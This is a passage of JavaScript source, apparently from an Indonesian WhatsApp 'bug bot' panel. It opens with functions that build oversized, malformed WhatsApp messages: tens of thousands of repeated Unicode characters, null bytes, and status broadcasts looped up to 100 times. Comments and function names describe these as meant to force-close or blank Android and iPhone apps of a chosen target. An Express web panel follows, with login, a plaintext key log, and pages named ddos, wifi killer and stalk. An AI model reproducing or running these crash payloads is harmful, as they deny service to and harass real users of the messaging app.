              forwardingScore: 999
            }
          }
        }
      }
    };
    await sock.relayMessage(target, PouMsg, { messageId: generateMessageID() });
  }
}

async function PLottiEStcJv(sock, target) {
  try {
    const PouMsg1 = generateWAMessageFromContent(target, {
      lottieStickerMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/575792415_1326859005559789_4936376743727174453_n.enc?ccb=11-4&oh=01_Q5Aa2wHHWbG7rC7tgA06Nu-D-aE4S0YhhV3ZUBkuvXsJvhm2-A&oe=692E7E33&_nc_sid=5e03e0&mms3=true",
            fileSha256: "Q285fqG3P7QFkMIuD2xPU5BjH3NqCZgk/vtnmVkvZfk=",
            fileEncSha256: "ad10CF3pqlFDELFQFiluzUiSKdh0rzb3Zi6gc4GBAzk=",
            mediaKey: "ZdPiFwyd2GUfnDxjSgIeDiaS7SXwMx4i2wdobVLK6MU=",
            mimetype: "application/was",
            height: 512,
            width: 512,
            directPath: "/v/t62.15575-24/575792415_1326859005559789_4936376743727174453_n.enc?ccb=11-4&oh=01_Q5Aa2wHHWbG7rC7tgA06Nu-D-aE4S0YhhV3ZUBkuvXsJvhm2-A&oe=692E7E33&_nc_sid=5e03e0",
            fileLength: "25155",
            mediaKeyTimestamp: "1762062705",
            isAnimated: true,
            stickerSentTs: "1762062705158",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            contextInfo: {
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363419085046817@newsletter",
                serverMessageId: 1,
                newsletterName: "POU HITAM BANGET 😹︎" + "ꦾ".repeat(12000)
              },
              quotedmessage: {
                paymentInviteMessage: {
                  expiryTimestamp: Date.now() + 1814400000,
                  serviceType: 3,
                }
              }
            }
          }
        }
      }
    }, { userJid: target })

    await sock.relayMessage(target, PouMsg1.message, {
      messageId: PouMsg1.key.id
    })
    console.log("DONE BY AiiSigma")

  } catch (bokepPou3menit) {
    console.error("EROR COK:", bokepPou3menit)
  }
}
// FUNCTION FORCE CLOSE KATANYA WKWK
async function PouHitam(sock, target) {
  const PouMessage = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: "POU HAMA 😹" + "\u0000".repeat(1000) + "https://Wa.me/stickerpack/poukontol",
          matchedText: "https://Wa.me/stickerpack/PouKontol",
          description: "\u74A7",
          title: "POU BIRAHI 😹",
          contextInfo: {
            mentionedJid: [target],
            forwardingScore: 1000,
            isForwarded: true,
            externalAdReply: {
              renderLargerThumbnail: true,
              title: "POU SANGE 😹",
              body: "click woi biar forcelose 😑👌",
              showAdAttribution: true,
              thumbnailUrl: "https://Wa.me/stickerpack/PouKontol",
              mediaUrl: "https://Wa.me/stickerpack/PouKontol",
              sourceUrl: "https://Wa.me/stickerpack/PouKontol"
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, PouMessage, {
    messageId: Date.now().toString()
  });
}
//FUNCTION BLANK IOS NO INVISIBLE
async function blankios(sock, target) {
  // Placeholder untuk mencegah crash jika mode ini dipilih
}

//FUNCTION FORCE CLOSE IOS INVISIBLE 
async function iosinVisFC3(sock, target) {
  const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
  const s = "𑇂𑆵𑆴𑆿".repeat(60000);
  try {
    let locationMessagex = {
      degreesLatitude: 11.11,
      degreesLongitude: -11.11,
      name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/OTAX",
    }
    let msgx = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessagex
        }
      }
    }, {});
    let extendMsgx = {
      extendedTextMessage: {
        text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
        matchedText: "OTAX",
        description: "𑇂𑆵𑆴𑆿".repeat(60000),
        title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
        previewType: "NONE",
        jpegThumbnail: "",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    }
    let msgx2 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          extendMsgx
        }
      }
    }, {});
    let locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
      url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
    }
    let msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage
        }
      }
    }, {});
    let extendMsg = {
      extendedTextMessage: {
        text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone,
        matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
        description: "𑇂𑆵𑆴𑆿".repeat(25000),
        title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "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",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    }
    let msg2 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          extendMsg
        }
      }
    }, {});
    let msg3 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage
        }
      }
    }, {});

    for (let i = 0; i < 100; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: [{
              tag: 'to',
              attrs: {
                jid: target
              },
              content: undefined
            }]
          }]
        }]
      });

      await sock.relayMessage('status@broadcast', msg2.message, {
        messageId: msg2.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: [{
              tag: 'to',
              attrs: {
                jid: target
              },
              content: undefined
            }]
          }]
        }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
        messageId: msgx.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: [{
              tag: 'to',
              attrs: {
                jid: target
              },
              content: undefined
            }]
          }]
        }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
        messageId: msgx2.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: [{
              tag: 'to',
              attrs: {
                jid: target
              },
              content: undefined
            }]
          }]
        }]
      });

      await sock.relayMessage('status@broadcast', msg3.message, {
        messageId: msg2.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: [{
              tag: 'to',
              attrs: {
                jid: target
              },
              content: undefined
            }]
          }]
        }]
      });
      if (i < 99) {
        await new Promise(resolve => setTimeout(resolve, 5000));
      }
    }
  } catch (err) {
    console.error(err);
  }
};

// INI BUAT BUTTON DELAY 50% YA ANJINKK@)$+$)+@((_
async function delayinvisible(sock, durationHours, X) {
  if (!sock) {
    console.error('❌ Socket tidak tersedia untuk delaylow');
    return;
  }

  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      return;
    }

    try {
      if (count < 30) {
        await Promise.all([
          protocolbug19(sock, X),
          delayloww(sock, X),
          sleep(500)
        ]);

        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/30 delaylow 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Success Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( 🍷 Indictive | Core V3 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// INI BUAT BUTTON DELAY 100% YA ANJINKK@)$+$)+@((_
// INI BUAT BUTTON ANDROID BLANK
async function androkill(sock, target) {
  for (let i = 0; i < 3; i++) {
    await PouButtonUi(sock, target);
    await protocolbug19(sock, target);
    await PLottiEStcJv(sock, target);
    await N3xithBlank(sock, target);
  }
  console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
}

// INI BUAT BUTTON BLANK IOS
async function forceandro(sock, target) {
  for (let i = 0; i < 1; i++) {
    await PouButtonUi(sock, target);
    await iosinVisFC3(sock, target);
  }
  console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
}

// INI BUAT BUTTON IOS INVISIBLE
async function fcios(sock, target) {
  for (let i = 0; i < 50; i++) {
    await iosinVisFC3(sock, target);
  }
  console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
}

// INI BUAT BUTTON FORCE CLOSE MMEK LAH MASA GA TAU
async function forklos(sock, target) {
  for (let i = 0; i < 3; i++) {
    await PouHitam(sock, target);
    await N3xithBlank(sock, target);
  }
  console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
}

// Middleware untuk parsing JSON
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.json());
app.use(express.static('public'));

// ==================== AUTH MIDDLEWARE ==================== //
function requireAuth(req, res, next) {
  const username = req.cookies.sessionUser;

  if (!username) {
    return res.redirect("/login?msg=Silakan login terlebih dahulu");
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  if (Date.now() > currentUser.expired) {
    return res.redirect("/login?msg=Session expired, login ulang");
  }

  // PENTING: Simpan data user agar bisa dibaca di route app.get
  req.user = currentUser;

  next();
}

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "Miyako", "login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  console.log(`[LOGIN DEBUG] Mencoba login - Username: "${username}", Key: "${key}"`);
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/dashboard");
});

// Tambahkan auth middleware untuk WiFi Killer
app.get("/dashboard", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, 'Miyako', 'dashboard.html');

  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      console.error(err);
      return res.status(500).send("Gagal memuat halaman dashboard");
    }

    const users = getUsers();
    const userCount = users.length.toString();
    const senderCount = "1";

    // Ambil data user spesifik yang sedang login
    const currentUser = users.find(u => u.username === req.user.username);

    // --- LOGIKA EXPIRED DATE ---
    let expiredStatus = "Permanent";
    if (currentUser && currentUser.expired) {
      const now = new Date();
      const expDate = new Date(currentUser.expired);

      if (isNaN(expDate.getTime())) {
        expiredStatus = "Permanent";
      } else if (now > expDate) {
        expiredStatus = "Expired";
        // Opsional: res.redirect('/expired-page'); 
      } else {
        // Menghitung sisa hari
        const diffTime = Math.abs(expDate - now);
        const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
        expiredStatus = `${diffDays} Hari Lagi`;
      }
    }
    // ---------------------------

    const username = req.user.username;
    const role = req.user.role || "Member";

    let result = data
      .replace(/\${username}/g, username)
      .replace(/\${role}/g, role)
      .replace(/\${userOnline}/g, userCount)
      .replace(/\${senderAktif}/g, senderCount)
      .replace(/\${expiredDate}/g, expiredStatus); // Inject ke HTML

    res.send(result);
  });
});

// Route untuk dashboard
app.get("/tools", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "tools.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file opsi.html:", err);
      return res.status(500).send("File dashboard tidak ditemukan");
    }
    res.send(html);
  });
});
// Endpoint untuk mendapatkan data user dan session
app.get("/api/option-data", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.status(404).json({ error: "User not found" });
  }

  // Ambil role dari data user
  const userRole = currentUser.role || 'user';

  // Format expired time
  const expired = new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });

  // Hitung waktu tersisa
  const now = Date.now();
  let daysRemaining = "Permanent";
  const expDate = new Date(currentUser.expired);
  if (!isNaN(expDate.getTime())) {
    const timeRemaining = currentUser.expired - now;
    daysRemaining = Math.max(0, Math.floor(timeRemaining / (1000 * 60 * 60 * 24)));
  }

  res.json({
    username: currentUser.username,
    role: userRole,
    activeSenders: sessions.size,
    expired: expired,
    daysRemaining: daysRemaining
  });
});

app.get("/profile", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, 'Miyako', 'profil.html');

  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      console.error(err);
      return res.status(500).send("Gagal memuat halaman profile");
    }

    // Ambil data dari req.user (hasil dari middleware requireAuth)
    const username = req.user.username;
    const role = req.user.role || "Member";

    // Definisikan variabel tambahan (Sesuaikan dengan field di database Anda)
    let daysRemaining = "Permanent";
    if (req.user.expired) {
      const expDate = new Date(req.user.expired);
      if (!isNaN(expDate.getTime())) {
        const now = Date.now();
        if (now > expDate) {
          daysRemaining = "Expired";
        } else {
          daysRemaining = Math.ceil((expDate - now) / (1000 * 60 * 60 * 24)).toString();
        }
      }
    }
    const activeSenders = sessions.size.toString();
    const createdAt = req.user.createdAt || "-";
    const expired = (req.user.expired && !isNaN(new Date(req.user.expired).getTime())) ? new Date(req.user.expired).toLocaleString("id-ID") : "Permanent";
    const key = req.user.key || "No Key";

    // Lakukan replace semua variabel agar muncul di HTML
    let result = data
      .replace(/\${username}/g, username)
      .replace(/\${role}/g, role)
      .replace(/\${daysRemaining}/g, daysRemaining)
      .replace(/\${activeSenders}/g, activeSenders)
      .replace(/\${createdAt}/g, createdAt)
      .replace(/\${expired}/g, expired)
      .replace(/\${key}/g, key);

    res.send(result);
  });
});

app.get("/tiktok", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "tiktok-downloader.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/tiktok2", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "tiktok.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/pin", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "pinterest.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/music", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "search-music.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/stats", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "stats.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/support", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "my-supports.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/sender", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "sender.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/yt", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "YouTube.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/ddos", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "ddos.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/anime", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "anime.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/grup", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "chatpublic.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/hentai", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "nsfw.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/wifi", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "wifi.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/fix", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "fixjs.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/ai", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "miyakoai.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/slot", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "slot.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/casino", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "casino.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/game", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "game.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/block", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "puzzle.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/stalk", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "stalk.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/ig-dl", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "reels.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/confess", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "confess.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file confess.html:", err);
      return res.status(500).send("File tidak ditemukan");
    }
    res.send(html);
  });
});

app.get("/codesnap", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "Miyako", "codesnap.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file codesnap.html:", err);
      return res.status(500).send("File tidak ditemukan");
    }
    res.send(html);
  });
});

/* 
USER DETECTIONS - HARAP DI BACA !!!
MASUKIN BOT TOKEN TELE LU DAN ID TELE LU ATAU ID GROUP TELEL LU
 
Gunanya buat apa bang?
